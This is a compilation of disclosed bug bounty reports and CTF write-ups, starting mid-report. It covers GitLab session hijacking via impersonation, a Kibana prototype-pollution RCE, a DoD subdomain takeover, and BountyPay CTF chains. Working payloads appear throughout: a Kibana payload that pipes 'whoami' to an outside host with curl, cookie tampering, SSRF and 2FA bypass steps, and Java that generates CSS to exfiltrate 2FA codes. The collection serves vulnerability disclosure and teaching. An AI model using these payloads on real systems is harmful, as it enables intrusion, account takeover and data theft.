1. Go to the active sessions settings tab and revoke all the sessions besides the current active one
1. Sign into gitlab app in other browser as administrator (`admin`)
1. Go to users admin section and impersonate `attacker` user
1. Update the active sessions tab as `attacker` and make sure the second session appeared there (this is the admin logged into your account)
{F420971}
1. Inspect the `Revoke` button and make sure you see the session ID there. Copy it.
████
1. Go to index page of gitlab as `attacker` (http://gitlab.bb/ in my case), I do not know why, but it is important step
1. Clear `attacker` browser's cookie
1. Open the developer console as `attacker` and manually set `_gitlab_session` to the copied one with:

```javascript
document.cookie = "_gitlab_session=█████";
```
9. Refresh the attacker's page and make sure you are now inside the impersonated session
{F420978}
10. Click `Stop impersonating` at the top-right corner as `attacker` and make sure you are now logged in as gitlab admin.
███

## Impact

Every gitlab authenticated user can escalate his privileges to admin ones and give complete access to all gitlab services, projects and abilities. Only he needs to do is ask admin to impersonate his account because of something works bad there.

**Summary (researcher):**

My Telegram channel about being the full-time bug bounty hunter, my tips and tricks:
🇺🇸 [BugBountyPLZen](https://t.me/+mY0ndZYzGbYxYmYy)

Мой Telegram-канал про фуллтайм баг-хантинг, советы и методики:
🇷🇺 [BugBountyPLZ](https://t.me/+WYgyG5n2_kM1Yzdi)

---

### [Remote Code Execution on Cloud via latest Kibana 7.6.2](https://hackerone.com/reports/852613)

- **Report ID:** `852613`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Elastic
- **Reporter:** @alexbrasetvik
- **Bounty:** 10000 usd
- **Disclosed:** 2020-07-28T19:45:35.016Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** A prototype pollution in Kibana can be used to gain remote code execution.

**Description:**

There is a prototype pollution bug in the upgrade assistant's telemetry collector, via a dangerous usage of `_.set`: https://github.com/elastic/kibana/blob/master/x-pack/plugins/upgrade_assistant/server/lib/telemetry/usage_collector.ts#L93

We can pollute the prototype by providing a specially crafted "upgrade-assistant-telemetry" "saved object".

The attached video provides a walkthrough. There is a bit of waiting involved at one point, I included the entire thing for completeness with a hint of when you can fast forward :) 

## Steps To Reproduce:

The following assumes an otherwise empty Kibana. If any steps breaks Kibana, you can `DELETE /.kibana*` and restart it to get going again.

  1. Update the kibana mappings so we can provide our "upgrade-assistant-telemetry" document. It's important to provide the full mapping and not just do a dynamic one, or Kibana can refuse to start up due to err-ing when validating mappings

```
PUT /.kibana_1/_mappings
{
  "properties": {
    "upgrade-assistant-telemetry": {
      "properties": {
        "constructor": {
          "properties": {
            "prototype": {
              "properties": {
                "sourceURL": {
                  "type": "text",
                  "fields": {
                    "keyword": {
                      "type": "keyword",
                      "ignore_above": 256
                    }
                  }
                }
              }
            }
          }
        },
        "features": {
          "properties": {
            "deprecation_logging": {
              "properties": {
                "enabled": {
                  "type": "boolean",
                  "null_value": true
                }
              }
            }
          }
        },
        "ui_open": {
          "properties": {
            "cluster": {
              "type": "long",
              "null_value": 0
            },
            "indices": {
              "type": "long",
              "null_value": 0
            },
            "overview": {
              "type": "long",
              "null_value": 0
            }
          }
        },
        "ui_reindex": {
          "properties": {
            "close": {
              "type": "long",
              "null_value": 0
            },
            "open": {
              "type": "long",
              "null_value": 0
            },
            "start": {
              "type": "long",
              "null_value": 0
            },
            "stop": {
              "type": "long",
              "null_value": 0
            }
          }
        }
      }
    }
  }
}
```

  2. With the mapping ready, we can index our own telemetry status doc:

```
PUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry
{
    "upgrade-assistant-telemetry" : {
      "ui_open.overview" : 1,
      "ui_open.cluster" : 1,
      "ui_open.indices" : 1,
      "constructor.prototype.sourceURL": "\u2028\u2029\nglobal.process.mainModule.require('child_process').exec('whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-')"
    },
    "type" : "upgrade-assistant-telemetry",
    "updated_at" : "2020-04-17T20:47:40.800Z"
  }
```

The payload pollutes the prototype, which in turn injects Javascript that spawns a shell process, in this case `whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-`

  3. Wait until collection happens again, or just restart Kibana. In the video I restart Kibana, which you can do via the cloud console. Go to `https://cloud.elastic.co/deployments/[your id]/kibana` and click "Force Restart".

  4. Kibana will take about a minute to start. Soon after starting, it'll do a telemetry collection run, that'll cause the above code to be injected and that will run the shell code.

Kibana will likely keep starting, run this, crash then restart. I cleaned up my deployment so it's not in a crash-restart loop.

## Impact

Any cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.

## Supporting Material/References:

The attached video recording walks through the entire attack chain.

## Impact

Any cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.

---

### [Subdomain takeover of ████](https://hackerone.com/reports/900062)

- **Report ID:** `900062`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** U.S. Dept Of Defense
- **Reporter:** @flavsec_
- **Bounty:** - usd
- **Disclosed:** 2020-07-08T17:39:50.514Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I was able to claim the subdomain: ████ using Microsoft Azure ( CDN profiles)

**Description:**

## Impact
Platform(s) Affected:
Subdomain
Azure CDN

## Step-by-step Reproduction Instructions

1. Using dig, I was able to determine that the subdomain '███████' was vulnerable to takeover. The record showed status: NXDOMAIN and was pointing to the CNAME: █████.
2. Using this information, I was able to create a new Azure CDN Profile with the name '██████████'. This would resolve to the CNAME record mentioned above.
3. I then created a Web App domain through Azure  where I uploaded a small proof html file through FTP, I then set the CDN's origin type to WebApp and selected the url that I created earlier, this would serve the proof file (█████/proof.html) , Last and final step I set the custom domain to ███████ and enabled ssl.
4. I was then able to view the uploaded site at https://████████/proof.html

## Suggested Mitigation/Remediation Actions
To mitigate this issue you can:

Remove the DNS record from the DNS zone if it is no longer needed.
Claim the domain name in a permanent DNS record so it cannot be used elsewhere.

## Impact

This is extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the ████ domain. This would allow them to post malicious content which would be mistaken for a valid site. They could steal cookies, bypass domain security, steal sensitive user data, malware distribution, etc.

---

### [[H1-2006 2020] Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or using a custom API attack tool](https://hackerone.com/reports/895172)

- **Report ID:** `895172`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** h1-ctf
- **Reporter:** @bcobain23
- **Bounty:** - usd
- **Disclosed:** 2020-06-22T20:59:43.350Z
- **CVE(s):** -

**Vulnerability Information:**

H1-2006 CTF Writeup
{F859938}

## Summary:
Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the limits of the user. Common access control vulnerabilities include:
* Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool.
* Allowing the primary key to be changed to another’s users record, permitting viewing or editing someone else’s account.
* Elevation of privilege. Acting as a user without being logged in, or acting as an admin when logged in as a user.
* Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges, or abusing JWT invalidation.
* CORS misconfiguration allows unauthorized API access.
* Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user. Accessing API with missing access controls for POST, PUT and DELETE.

## Steps To Reproduce:

1- Information Disclosure 

When performing a search for BountyPay on Google, a result appears on Github https://github.com/bounty-pay-code/request-logger/blob/master/logger.php, we access this and it shows us a Logger file that contains log information in the path /bp_web_trace.log. When we visit https://app.bountypay.h1ctf.com/bp_web_trace.log it downloads the .log file which contains base64 encoded data. 

{F861649}
{F861648}

We send this data to Burp Suite / Decoder and it provides us with the following information:

Base64 Encoded:
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==

Base64 Decoded:

{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}

{F861647}

Well, now we have a username and password to access https://app.bountypay.h1ctf.com, but upon entering it asks for a second authentication factor that we do not have.

2- Login 2FA Bypass

{F861666}
{F861669}

Now we have a double authentication factor, but we do not have the 10-character password that is sent to the mobile phone. This password contains characters like A-Z, a-z and 0-9. We try random characters but without results. When inspecting element, we can see that the following is found:

<input type="hidden" name="challenge" value="a829e6865ae4ef4ace5c24b091fa8a91">, where value corresponds to an MD5 hash corresponding to the 10 character password. We try to decode this hash and get no results.

Now if we consider that the password contains 10 characters that can be A-Z , a-z y 0-9, we create our hash MD5 with the amount of characters requested on the web https://www.md5hashgenerator.com/. We create a string with 1111111111 (can be whatever) 
and the result of our hash is e11170b8cbd2d74102651cb967fa28e5.

{F861668}

We replace the hash in "value" mentioned above and we put ours, as we know what is the string correct we use it as our password for the 2FA managing to make the Bypass.

{F861670}

 We entered and we found BountyPay Dashboard, We try to load the transactions corresponding to May 2020, but it gives us the message "No Transactions To Process". Well in this part I thought "now I have to make the payment, but wait, this is not easy hahaha". We review the transactions of the 12 months and it sends the same message, so we deduce that we do not have the permissions to carry out this operation with the account of brien oliver.

{F861667}
{F861671}

We try to use the cookie to be able to change users, but it is not possible to carry out the operation. At this moment I did not know well what I could do to move forward, so I stopped and went to have a coffee to clear my head for a few moments, after several attempts I could not continue or find something that would help me, which is why I started to check other subdomains in search of something to help me continue, use Dirb, Dirsearch, etc.

After several hours look at the cookie again and note that it is again a base64 and when sending it to the Decoder in Burp Suite it shows the following information:
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}.

{F861672}
{F861673}

Here I couldn't go any further and I was stuck again. I began to review what else I could see within the requests when trying to load the transactions by month and year, I notice that the answer appears:
{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=05&year=2020","data":"{\"description\":\"Transactions for 2020-05\",\"transactions\":[]}"}

3- SSRF

In order to use the SSRF vulnerability we must take the API found in the previous step and use it in our base64 encoded cookie. The information that the cookie gives us currently is:
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}

So what we need is to modify this base64, to use the API and to be able to access https://software.bountypay.h1ctf.com, which if we enter directly gives us a 401 Unauthorized "You do not have permission to access this server from your IP Address".

First if we go directly to the API https://api.bountypay.h1ctf.com we found a redirect in "REST API", ok now we will use this redirect to run our SSRF and access the URL that gives us 401.
How do we do it? We take the cookie, we modify it, we must go two directories behind and this would look like this:
 {"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}

We replace "F8gHiqSdpK" for "../../redirect?url=https://software.bountypay.h1ctf.com/#" and this allows us to internally access the URL that 401 Unauthorized gave us. Well now that we can enter we must list directories, of course the aforementioned must be encoded in base64 and put it in the cookie.

Because testing brute forcing directory one by one and then passing it to base64 to send it, manually is very slow, so we create a Python script to list directories and when we get a 200 response, we will use that directory to pass it to base64 and log into https://software.bountypay.h1ctf.com/uploads/BountyPay.apk to download the application.
***It looks simple right, believe me it was not.***
Python Script:
{F861692}
{F861693}

4- Harcoded Validation

Now we have our APK for which I use a mobile phone with Android for testing, I install the application and it asks for a user, we enter it but it does nothing more.
In this part we must decompile the downloaded apk file and for this I use apktools.
We execute "apktool d BountyPay.apk" and leaves us a folder where we agree to review our AndroidManifest.xml.
In this part what is interesting are the "intent", of which we find 3 parts, but ok and now that, how can I execute this ?. Well I found a practical guide at http://www.xgouchet.fr/android/index.php?article42/launch-intents-using-adb and https://stackoverflow.com/questions/22921637/android-intent-data-uri-query-parameter
If we understand these guides we can start executing the instructions using adb as follows:

First of all we run the application and enter a username and then enter the following commands:

{F861695}

First command:
adb shell am start -a "android.intent.action.VIEW" -d "one://part?start=PartTwoActivity"

{F861696}

Second command:
adb shell am start -a "android.intent.action.VIEW" -d "two://part?two=light\&switch=on" 
Here it gives us a code 459a6f79ad9b13cbcb5f692d3cc7a94d and it asks for a "Header Value", it appears in the code inside the manifest and is X-Token, we enter it and we reach the third part.

{F861698}

We enter the following below:
adb shell am start -a "android.intent.action.VIEW" -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"
and asks us "Submit leaked hash"

Until now we do not have this value, so we will have to capture the logs with the following command:
adb -d logcat bounty.pay:I

Now we enter again:
adb shell am start -a "android.intent.action.VIEW" -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"

We stop it as soon as the word "token" appears on the screen and we enter this Hash on the phone to pass the apk 3 challenge.
Now we have our token from the X-Token apk: 8e9998ee3137ca9ade8f372739f062c1 and we must see what we can do with this token.

{F861699}
{F861700}


5- Sensitive information disclosure

We go back to Twitter and check some Hint in Hackerone, but we don't see something relevant, so we go to Twitter BountyPay and we only see that a new person Sandra Allison has entered. If we review Sandra appears indicating "First Day at BountyPayHQ" showing her credential where we can view her STF:8FJ3KFISL3

{F861707}
{F861706}

What can we do with her STF:8FJ3KFISL3  ?

Previously, when using dirsearch to the API, it gave us the following:
/api/accounts/login
/api/accounts/signin
/api/accounts/logon
/api/staff

So we started testing the X-Token: 8e9998ee3137ca9ade8f372739f062c1 that we got from the apk by sending requests GET, and gives us the following information:
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]

{F861709}

Well, the X-Token works, but we still can't move forward. In this part I started to try the method POST and we put staff_id=STF:8FJ3KFISL3 Sandra user and boom gives us an answer:
{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}

{F861710}

Now we have created account, user and password of Staff. We test the credentials and enter to https://staff.bountypay.h1ctf.com

{F861712}
{F861711}

6- Privilege Escalation

Already within the account of Sandra as Staff we reviewed the page and we found "Home", "Support Tickets", "Profile" y "Logout".
We entered each of the options but we did not find anything useful to perform any other operation, this was one of the hardest parts of getting through, you will understand why.

We check the source code of the page, but we did not find anything useful.

We go to the developer tools in Firefox (es igual en Chrome) and we entered to review the debugger where we found 3 .js files
The one that specifically catches our attention is website.js which contains the following:

{F861721}

$('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));

Well, what we see here, first we find that there is a function with which we could escalate privileges to Admin, but how?

Let's keep checking and see that this applies to the "click" function, but we still don't know how to use this.

Let's see again, we have a file and a function with which we can escalate privileges, so we dedicate ourselves to find out how to use this and make the administrator give us this privilege.

When we review the options that the page gives us at the bottom we can see that it says "Report This Page", we click on it and it gives us the option to report now and also the following information:
"Pages in the /admin directory will be ignored for security"

{F861725}

Now we know we can get to /admin but we can't go to a directory below because of page restrictions.

We perform the "Report This Page" operation again and intercept with Burp to check what data or useful information it is sending and we see that in the URL it sends:
GET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l 

Again we see a base64 crash that contains /?Template=home

We know that we have to escalate privileges in order to overcome this part, but I still can't see how?

I go back once more to review website.js and try to figure out how to use this function to go from being Staff to Admin.

We try to URL https://staff.bountypay.h1ctf.com/admin/upgrade?username=8FJ3KFISL3 but it gives us back "Only admins can perform this"

{F861726}

OK, if we inspect element we see that the avatar is an "input" so we will try to use it to include the functions of the .js file so we will put avatar 3 = tab4 upgradeToAdmin

{F861727}

We send the request to Burp to see that this field is modified, this is the first step.

Now we must modify the URL and add an "Array" to use the function and escalate privileges using and Burp, we do this with the Support Tickets option, where we must practically call several URLs on the same page and we do it with the following URL:
https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4

{F861728}

We intercept this in Burp Suite because the browser removes us #tab4

Select "Report This Page", the report is sent with our modifications, the page is pasted without loading, so we must return to "Home" URL https://staff.bountypay.h1ctf.com

{F861730}

Boom we see the "Admin" tab, now we access it and we see the user of marten.mickos and his password h&H5wy2Lggj*kKn4OD&Ype

{F861731}

We must re-enter the site, but now as admin with the account Marten Mickos in the URL https://staff.bountypay.h1ctf.com


7- 2FA Payments  Bypass through SSRF

Now in this last part we login to https://staff.bountypay.h1ctf.com with user account marten.mickos and password h&H5wy2Lggj*kKn4OD&Ype

{F861735}

Well, at the first admission, you ask us to enter 2FA again as at the beginning.

It indicates that a 10-character password is sent to the mobile phone and characters between A-Z, a-z and 0-9

Try modifying as the first 2FA, inspecting element we create an MD5 with the following:
e11170b8cbd2d74102651cb967fa28e5 = 1111111111

{F861737}

Now we are in the Marten Mickos account, we load the May 2020 transactions, well now it shows us the information and the payment button.

{F861738}

We select to pay, but again another challenge asks us for another 2FA authentication to make the payment, this time modifying html no longer works.

{F861740}

We intercept the request to see what information is being sent and we see the following:
app_style=https://www.bountypay.h1ctf.com/css/uni_2fa_style.css

We visit this URL to see if it gives us some type of information to overcome this challenge and it only shows us the following:

/**
Template for the UNI 2FA App
 */

body {
    background-color: #FFFFFF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-image:url("https://www.bountypay.h1ctf.com/images/bountypay.png");
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}

So now with what we have, we see that in the request a .css file is sent and will look for which is why we will need to create a .css file so that it can be fetched and mounted on our ssl server.

Now we create the following buri.css file

import java.io.FileWriter; 
import java.io.IOException;

public class CssExfiltrator{

    String hostname = "https://u61wqtubaeskyx8lah6eb0705rbhz6.example.com/"; // https://example.com/
    String cssFile = "bcobain23.css"; // uni_2fa_style.css

    String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-";
    
    public void writeFile(StringBuilder css){
        try {
            FileWriter fw = new FileWriter(cssFile);
            fw.write(css.toString());
            fw.close();
            System.out.println("Successfully wrote css file");
          } catch (IOException e) {
            System.out.println("An error occurred.");
            e.printStackTrace();
          }
    }

    public void getInputNames(String input){
        StringBuilder css = new StringBuilder();
        for(char s:characters.toCharArray()){
            css.append("input[name^='").append(input).append(s).append("'] {background: url('").append(hostname).append(s).append("');}").append("\n");
        }
        System.out.println(css.toString());
        writeFile(css);
    }

    public void getInputValues(){
        StringBuilder css = new StringBuilder();
        for(int i=1; i<=7; i++){
            for(char s:characters.toCharArray()){
                css.append("input[name='code_").append(i).append("'] {background: url('").append(hostname).append(i).append("/").append(s).append("');}").append("\n");
            }
        }
        System.out.println(css.toString());
        writeFile(css);
    }

    public static void main(String[] args){
        CssExfiltrator cssExf = new CssExfiltrator();

        /*
        if(args.length > 0){
            cssExf.getInputNames(args[0]);
        }else{
            cssExf.getInputNames("");
        }
        */
        cssExf.getInputValues();
    }
}

We mount it on our server, use burp collaborator and see the following:

{F861736}

We begin to exfiltrate the 2FA code one by one, in the image we can see that it gives us a number that is the correct position next to the corresponding character

{F861734}

We obtain the code, place it in an orderly manner and make the payment to the Hackers.
Challenge Completed.

Actually this was hours of suffering and my first participation in CTF, I thank the people who spent time creating this challenge, since I learned many new things.

## Impact

Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the limits of the user. Common access control vulnerabilities include:
* Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool.
* Allowing the primary key to be changed to another’s users record, permitting viewing or editing someone else’s account.
* Elevation of privilege. Acting as a user without being logged in, or acting as an admin when logged in as a user.
* Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges, or abusing JWT invalidation.
* CORS misconfiguration allows unauthorized API access.
* Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user. Accessing API with missing access controls for POST, PUT and DELETE.

---

### [[h1-2006 2020]  Writeup h12006 CTF](https://hackerone.com/reports/895795)

- **Report ID:** `895795`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** h1-ctf
- **Reporter:** @0xxl
- **Bounty:** - usd
- **Disclosed:** 2020-06-19T16:11:13.643Z
- **CVE(s):** -

**Vulnerability Information:**

^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

## Impact

.

**Summary (researcher):**

You can find the writeup with all images here https://github.com/chinchila/h12006
Sorry for the inconvenience.

---

### [[H1-2006 2020] CTF write-up](https://hackerone.com/reports/894604)

- **Report ID:** `894604`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** h1-ctf
- **Reporter:** @godiego
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T17:13:49.291Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Hello HackerOne team! I finally managed to solve this long but really nice CTF! Here is the flag: ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$. You can access my writeup at https://diego95root.github.io/posts/H1-2006-CTF/. It's password protected, the password is the flag.

Thank you so much for organising the CTF, definitely learned a lot!

## Impact

None, I paid all the hackers :)

---

### [[H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337)

- **Report ID:** `892337`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** h1-ctf
- **Reporter:** @sturedman
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:29:59.325Z
- **CVE(s):** -

**Vulnerability Information:**

# H1-2006  CTF Writeup
This is a story about both solving a CTF and, most importantly, on how to make friends during the journey and learn a lot a valuable things for the future.

On a Friday evening I saw this tweet from HackerOne:
{F853545}

Honestly, last CTF was really hard so I didn't really thought about actually completing this one too, and I still think Live Hacking Events will likely be just a dream for at least some years.

But yeah, we are hackers and when we see a CTF we want to at least try solving it, right? 

So, a couple of days later (also hackers enjoy taking some beers with friends on the weekend after all) I started playing on the CTF and following are explained all the steps that I took to (unexpectedly) finish it.

## Infographic
The following infographic illustrates the steps taken in my solution (totally inspired by @manoelt).
{F856596}


## CTF Creators
Something that really catched my eyes was that the CTF Creators were known to me. 
Indeed I already was following both of them on Twitter, Adam (@adamtlangley) & Kyle (@B3nac)!
{F853559}

This was very useful for 3 reasons:
1. Now I knew that Android challenges would be likely as B3nac was involved
2. As I have solved all the challenges created by Adam on *ctfchallenge.co.uk*, I would have been slightly advantaged as I already knew how he typically creates them. Sorry Adam :D
3. I just knew that this time I could do it!


## Recon
As @nahamsec teached me during his live streams, target recon is a huge part of a security assessment and it is usually the first thing I do when I am on a new target.

Indeed, the main CTF URL was:
- https://bountypay.h1ctf.com/

...and there was nothing on it but two login forms!
{F853574}

So, I launched my custom recon script on domain `bountypay.h1ctf.com` to see if there were other interesting subdomains as that's usually the case.
Indeed, I found the following subdomains:
- app.bountypay.h1ctf.com (Customer login above)
- staff.bountypay.h1ctf.com (Staff login above)
- api.bountypay.h1ctf.com (**New!**)
- software.bountypay.h1ctf.com (**New!**)

As said before, the first two are simple login forms, so let's take a look at the others two.

### api.bountypay.h1ctf.com

{F853600}

As the name said, this will surely host all the application APIs, so surely I will have to enumerate all of them (more of this later).
Apart from that, I saw a clear Open Redirect on the link displayed:
- https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API

An Open Redirect is a vulnerability by itself as it could be also leveraged for phishing but it could be also escalated through an SSRF and that was my idea at that time.

### software.bountypay.h1ctf.com

{F853606}

That's interesting as we can see a 401 Forbidden with a note that basically says that we have to use a whitelisted IP address...and that could be surely connected with the possible SSRF found before in order to bypass this restriction!

## Ffufing everything
So next step involved continuing recon phase by finding if there were hidden files or directories in all the subdomains.
I used the following command and a custom wordlist after having used the *common.txt* one: 
`ffuf -u [HOSTS]/FUZZ -t 400 -w $WORDLIST`

I found that on https://api.bountypay.h1ctf.com/api/ there was the *staff* endpoint that resulted in the following 401 error message:
- `["Missing or invalid Token"]`

This surely will be useful later...

Then I found that on https://app.bountypay.h1ctf.com host there were some accessible *Git* contents:
- https://app.bountypay.h1ctf.com/.git/index
- https://app.bountypay.h1ctf.com/.git/HEAD
- https://app.bountypay.h1ctf.com/.git/config

In particular, the *.git/config* file contained a reference to a BountyPay related Github repository (https://github.com/bounty-pay-code/request-logger.git):

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

## Git exploitation
By accessing the only file exposed, https://github.com/bounty-pay-code/request-logger/blob/master/logger.php, 
I noticed a line surely worth of interest:
```
file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
``` 

So, it seems that there is an interesting file that we have to access!

The content of *bp_web_trace.log*, accessible at https://app.bountypay.h1ctf.com/bp_web_trace.log had the following content:
```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

As we can see from the code on Github, these are timestamps followed by Base64 encoded strings that, once decoded for example with Burp Decoder, represent:
```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

So...great, we have the credentials for a new user called **Brian Oliver**!

Let's try to use those credentials on the login form on https://app.bountypay.h1ctf.com as I found those in that domain.

{F853852}

Damn! We have also to insert a 2FA code.

Let's take a look at the related 2FA POST request:
```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 100
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

username=brian.oliver&password=V7h0inzX&challenge=70fc6bcd3409b8acaec02992d31b4d03&challenge_answer=xxxxxxxx
```

So, I noticed that I need also a *challenge* and a *challenge_answer*.
